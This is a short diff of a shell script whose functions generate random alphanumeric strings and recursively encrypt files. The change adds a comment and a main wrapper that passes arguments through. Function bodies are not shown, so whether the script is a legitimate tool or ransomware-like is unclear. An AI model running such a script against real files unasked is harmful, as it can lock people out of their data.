@@ -37,7 +37,7 @@ function current_timestamp (){
 
 function get_random_alphanum() {
 
-
+# python script:  indentation and whitespace matters, spaces over tabs.
 local python_get_random_alphanum=$(
 python - <<EOF
 from random import choice;
@@ -127,4 +127,10 @@ function encrypt_files_recursively () {
 
 }
 
-echo $( encrypt_files_recursively )
+# entry to main function
+function main() {
+    echo $( encrypt_files_recursively )
+}
+ 
+# call main function and pass all paramaters to functions
+echo $( main "${@}" )
